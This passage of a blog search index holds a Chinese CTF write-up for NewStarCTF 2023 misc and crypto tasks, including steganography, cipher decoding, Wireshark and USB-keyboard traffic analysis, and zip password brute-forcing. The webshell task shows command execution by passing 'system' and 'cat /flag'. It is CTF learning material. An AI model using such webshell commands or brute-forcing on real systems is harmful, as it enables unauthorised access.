<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>newstarctf2023_misc</title>
    <link href="/2023/11/19/newstar2023-misc/"/>
    <url>/2023/11/19/newstar2023-misc/</url>
    
    <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-MISC-WP"><a href="#NewStarCTF-2023-MISC-WP" class="headerlink" title="NewStarCTF_2023_MISC_WP"></a>NewStarCTF_2023_MISC_WP</h1><h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="misc-CyberChef’s-Secret"><a href="#misc-CyberChef’s-Secret" class="headerlink" title="misc-CyberChef’s Secret"></a>misc-CyberChef’s Secret</h3><p>搜索标题，找到一个在线解密网站</p><p>直接梭哈</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//www.ddosi<span class="hljs-meta">.org</span>/<br></code></pre></td></tr></table></figure><h3 id="misc-空白格"><a href="#misc-空白格" class="headerlink" title="misc-空白格"></a>misc-空白格</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe">由空格等不可见字符组成的隐写<span class="hljs-literal">_</span>部分<br>这里的不可见字符是由空格，制表符，回车组成的信息<br></code></pre></td></tr></table></figure><p>White_space</p><p>white_space是一种编程语言</p><p>由“空格”，“回车”，“tab”组成</p><p>在线解码：<a href="https://vii5ard.github.io/whitespace/">Whitelips the Whitespace IDE (vii5ard.github.io)</a></p><p>将文本丢进去即可</p><h3 id="misc-流量！鲨鱼！"><a href="#misc-流量！鲨鱼！" class="headerlink" title="misc-流量！鲨鱼！"></a>misc-流量！鲨鱼！</h3><p>wireshark分析</p><p>利用http.response.code&#x3D;&#x3D;200过滤</p><p>在某条记录里面发现base64编码的数据，解码两次，即可得到flag</p><h3 id="misc-机密图片"><a href="#misc-机密图片" class="headerlink" title="misc-机密图片"></a>misc-机密图片</h3><p>打开题目，是一张图片，图片是二维码</p><p>扫描二维码，并没有发现</p><p>尝试了好几种方法</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span>.binwalk分离，发现zlib文件，<span class="hljs-number">010</span>查看，发现图片的文件尾，新建文件，加上文件头，还是查看不了<br><span class="hljs-number">2</span>.fo<span class="hljs-comment">remost分离，并没有分离出什么有用的东西</span><br><span class="hljs-number">3</span>.stegslove查看，但是也没看出什么<br></code></pre></td></tr></table></figure><p>问了9c神</p><img src="/2023/11/19/newstar2023-misc/image-20230930170305419.png" class title="image-20230930170305419"><p>找到对应的图片，利用Analyse里的Data extract功能，即可获得flag</p><img src="/2023/11/19/newstar2023-misc/image-20230930170423055.png" class title="image-20230930170423055"><h3 id="misc-压缩包们"><a href="#misc-压缩包们" class="headerlink" title="misc-压缩包们"></a>misc-压缩包们</h3><p>本次misc最难一道了(个人感觉</p><p>首先得到一个没有后缀的文件</p><p>先用010一直看，看个不停，只发现了一串base64编码</p><p>解码得到一句话</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">I like six-<span class="hljs-keyword">digit </span>numbers <span class="hljs-keyword">because </span>they are very concise <span class="hljs-keyword">and </span>easy to remember.<br></code></pre></td></tr></table></figure><p>可知压缩包有6位数密码</p><p>由标题可知，是压缩包，将文件头改为50 4B 03 04</p><p>然后把flag.zip解压出来</p><img src="/2023/11/19/newstar2023-misc/image-20230930233744875.png" class title="image-20230930233744875"><p>把加密位改回去</p><img src="/2023/11/19/newstar2023-misc/image-20230930233833163.png" class title="image-20230930233833163"><p>然后ARCHPR爆破</p><img src="/2023/11/19/newstar2023-misc/image-20230930233923254.png" class title="image-20230930233923254"><p>得到密码，打开即可获得flag</p><h3 id="crypto-brainfuck"><a href="#crypto-brainfuck" class="headerlink" title="crypto-brainfuck"></a>crypto-brainfuck</h3><p>brainfuck在线解密即可</p><h3 id="crypto-Caesasr’s-Secret"><a href="#crypto-Caesasr’s-Secret" class="headerlink" title="crypto-Caesasr’s Secret"></a>crypto-Caesasr’s Secret</h3><img src="/2023/11/19/newstar2023-misc/image-20230930125431540.png" class title="image-20230930125431540"><h3 id="crypto-栅栏密码"><a href="#crypto-栅栏密码" class="headerlink" title="crypto-栅栏密码"></a>crypto-栅栏密码</h3><img src="/2023/11/19/newstar2023-misc/image-20230930125635637.png" class title="image-20230930125635637"><p>解题网站:<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</a></p><h3 id="crypto-Vigenere"><a href="#crypto-Vigenere" class="headerlink" title="crypto-Vigenère"></a>crypto-Vigenère</h3><p>搜去年NewStarCTF week1的crypto wp，搜到相似的题目，发现密钥是kfc，找个网站解码，还真是</p><p><a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">维吉尼亚密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</a></p><p><a href="https://guballa.de/vigenere-solver">Vigenere Solver | guballa.de</a></p><h3 id="crypto-babyencoding"><a href="#crypto-babyencoding" class="headerlink" title="crypto-babyencoding"></a>crypto-babyencoding</h3><p>附上一个工具网站:</p><p><a href="http://www.hiencode.com/">CTF在线工具-CTF工具|CTF编码|CTF密码学|CTF加解密|程序员工具|在线编解码 (hiencode.com)</a></p><p>第一个base64，第二个base32，第三个UUencode</p><p>前两个可以直接用cyber解码，最后一个用上面的网站即可</p><h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="misc-新建空白文档"><a href="#misc-新建空白文档" class="headerlink" title="misc-新建空白文档"></a>misc-新建空白文档</h3><p>word隐藏+新与佛论禅解码</p><h3 id="misc-永不消逝的电波"><a href="#misc-永不消逝的电波" class="headerlink" title="misc-永不消逝的电波"></a>misc-永不消逝的电波</h3><p>音频分析+摩斯解码</p><h3 id="misc-base！"><a href="#misc-base！" class="headerlink" title="misc-base！"></a>misc-base！</h3><p>base64隐写</p><h3 id="misc-jvav（学习）"><a href="#misc-jvav（学习）" class="headerlink" title="misc-jvav（学习）"></a>misc-jvav（学习）</h3><p>java盲水印</p><h3 id="misc-webshell（学习）"><a href="#misc-webshell（学习）" class="headerlink" title="misc-webshell（学习）"></a>misc-webshell（学习）</h3><p>解码之后就不会了</p><p>看完wp，发现是get传system</p><p>post传cat &#x2F;flag</p><h2 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h2><h3 id="misc-阳光开朗大男孩"><a href="#misc-阳光开朗大男孩" class="headerlink" title="misc-阳光开朗大男孩"></a>misc-阳光开朗大男孩</h3><p>两个文件，一个flag.txt，一个secret.txt</p><p>secret.txt是社会主义核心价值观编码</p><p>解码之后是this_password_is_<strong>s000_h4rd_p4sssw0rdddd</strong>，这部分是密码</p><p>然后emoji解码</p><p>解密网站:</p><p><a href="https://aghorler.github.io/emoji-aes/">emoji-aes (aghorler.github.io)</a></p><h3 id="misc-大怨种"><a href="#misc-大怨种" class="headerlink" title="misc-大怨种"></a>misc-大怨种</h3><p>stegsolve丁帧</p><p>然后扫码</p><p><strong>汉信码</strong></p><h3 id="misc-2-分析-学习"><a href="#misc-2-分析-学习" class="headerlink" title="misc-2-分析(学习)"></a>misc-2-分析(学习)</h3><p><del>这道题其实跟我的猜想一样，我好像记得我交过flag的？好像不对？算了</del></p><p><strong>考点</strong>：HTTP流量分析、简单溯源</p><p>Flag由三个信息构成：登录用户名、存在漏洞的文件名、写入的WebShell文件名。</p><p>根据我们的常识，一般登录请求都是POST方式的请求，因此可以先过滤出所有的POST请求：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">http &amp;&amp; http<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.method</span> == POST<br></code></pre></td></tr></table></figure><p>其次是存在漏洞的文件名和WebShell文件名，可以看到有大量的目录扫描流量，先使用WireShark过滤器过滤掉响应状态码为404的响应：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">http &amp;&amp; http<span class="hljs-selector-class">.response</span><span class="hljs-selector-class">.code</span> != <span class="hljs-number">404</span><br></code></pre></td></tr></table></figure><p>对剩下的流量进行分析，关注到1267号流量响应比较奇怪：</p><img src="/2023/11/19/newstar2023-misc/image-20231022214352118.png" class title="image-20231022214352118"><p>右键点击那个流量</p><img src="/2023/11/19/newstar2023-misc/image-20231022214428319.png" class title="image-20231022214428319"><p>溯源</p><p>于是找到index.php存在漏洞，并且写入了wh1t3g0d.php这个Shell，结束</p><h3 id="misc-键盘侠（学习）"><a href="#misc-键盘侠（学习）" class="headerlink" title="misc-键盘侠（学习）"></a>misc-键盘侠（学习）</h3><p>摘自官方wp:</p><p>打开题目发现是USB流量，结合题目名猜测是键盘流量，使用WireShark过滤器过滤出所有的键盘流量，然后导出保存为res.pcapng：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">usb.src <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;1.15.1&quot;</span><br></code></pre></td></tr></table></figure><p>使用tshark命令对流量数据进行提取并去除空行：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">tshark</span> -r res.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line)!=<span class="hljs-number">17</span>:<br>        <span class="hljs-keyword">continue</span><br>    nums.append(line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]+line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>])<br>keys.close()<br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:    <br>    <span class="hljs-keyword">if</span> n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">&quot;00&quot;</span> :        <br>        <span class="hljs-keyword">continue</span>    <br>    <span class="hljs-keyword">if</span> n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] <span class="hljs-keyword">in</span> normalKeys:       <br>        <span class="hljs-keyword">if</span> n[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]==<span class="hljs-string">&quot;02&quot;</span>:            <br>            output += shiftKeys [n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>]]        <br>        <span class="hljs-keyword">else</span> :            <br>            output += normalKeys [n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>]]<br>    <span class="hljs-keyword">else</span>:        <br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;output :n&#x27;</span> + output)<br></code></pre></td></tr></table></figure><p>得到如下结果：</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">nw3lc0m3<span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-keyword">to</span><span class="hljs-variable">&lt;SPACE&gt;</span>newstar<span class="hljs-variable">&lt;SPACE&gt;</span>ctf<span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-number">2023</span><span class="hljs-variable">&lt;SPACE&gt;</span>flag<span class="hljs-variable">&lt;SPACE&gt;</span>is<span class="hljs-variable">&lt;SPACE&gt;</span>here<span class="hljs-variable">&lt;SPACE&gt;</span>vvvvbaaaasffjjwwwwrrissgggjjaaasdddduuwwwwwwwwiiihhddddddgggjjjjjaa1112333888888<span class="hljs-variable">&lt;ESC&gt;</span><span class="hljs-variable">&lt;ESC&gt;</span><span class="hljs-number">2</span>hhxgbffffbbbnnat<span class="hljs-variable">&lt;CAP&gt;</span><span class="hljs-variable">&lt;CAP&gt;</span>ff<span class="hljs-variable">&lt;DEL&gt;</span>lll<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>aaa<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>gggg<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>&#123;<span class="hljs-number">999</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-number">999</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-number">11</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-number">9</span>aaa<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>eb2---<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>a450---<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-number">2</span>f5f<span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>--<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-number">7</span>bfc[<span class="hljs-literal">unknown</span>][<span class="hljs-literal">unknown</span>][<span class="hljs-literal">unknown</span>]-<span class="hljs-number">8989</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>dfdf<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-number">4</span>bfa4bfa<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-number">85848584</span>&#125;&#125;&#125;<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>&#125;]<span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;SPACE&gt;</span>nice<span class="hljs-variable">&lt;SPACE&gt;</span>work!<span class="hljs-number">1</span>yyoou<span class="hljs-variable">&lt;SPACE&gt;</span>ggot<span class="hljs-variable">&lt;SPACE&gt;</span>tthhis<span class="hljs-variable">&lt;SPACE&gt;</span>fllag<br></code></pre></td></tr></table></figure><p><DEL>表示删除，<SPACE>表示空格，根据这个按键顺序对数据进行处理后得到flag</SPACE></DEL></p><h3 id="misc-滴滴滴（学习）"><a href="#misc-滴滴滴（学习）" class="headerlink" title="misc-滴滴滴（学习）"></a>misc-滴滴滴（学习）</h3><p><del>一个音频，一张图片，听得出来是拨号音，但是没找到(</del></p><p>知识点：steghide隐写，DTMF</p><p>拨号音识别：</p><p><a 